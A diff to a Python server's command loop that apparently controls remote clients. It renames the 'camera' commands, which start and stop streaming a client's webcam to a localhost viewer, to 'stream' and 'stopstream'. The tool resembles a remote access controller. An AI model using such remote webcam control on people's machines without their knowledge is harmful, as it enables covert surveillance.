@@ -478,13 +478,13 @@ def input_loop():
             print("    notimeout:ping -t 8.8.8.8   Run forever until cancel")
             print()
             print("  SHORTCUTS (auto-routes to gui):")
-            print("    camera_app        Open Windows Camera app")
+            print("    camera            Open Windows Camera app")
             print("    recorder          Open Sound Recorder")
             print("    settings          Open Windows Settings")
             print("    calc              Open Calculator")
             print()
             print("  WEBCAM VIEWING:")
-            print("    After 'camera', open: http://localhost:4444/camera?id=<client_id>")
+            print("    After 'stream', open: http://localhost:4444/camera?id=<client_id>")
             print()
             print("  SERVER:")
             print("    exit              Shut down THIS server (not client)")
@@ -497,7 +497,7 @@ def input_loop():
             print("[*] Shutting down server.")
             os._exit(0)
 
-        if stripped == "camera":
+        if stripped == "stream":
             # Start camera streaming on active client
             with lock:
                 if not active_client:
@@ -510,14 +510,14 @@ def input_loop():
                 if client["command_running"]:
                     print(f"[!] Command already running on {active_client}. Cancel first.")
                     continue
-                client["pending_command"] = "camera"
+                client["pending_command"] = "stream"
                 client["command_running"] = True
             print(f"[*] Camera stream started on {active_client}")
             print(f"[*] View at: http://localhost:4444/camera?id={active_client}")
             print("[*] Waiting for client to connect...")
             continue
 
-        if stripped == "stopcamera":
+        if stripped == "stopstream":
             # Stop camera streaming on active client
             with lock:
                 if not active_client:
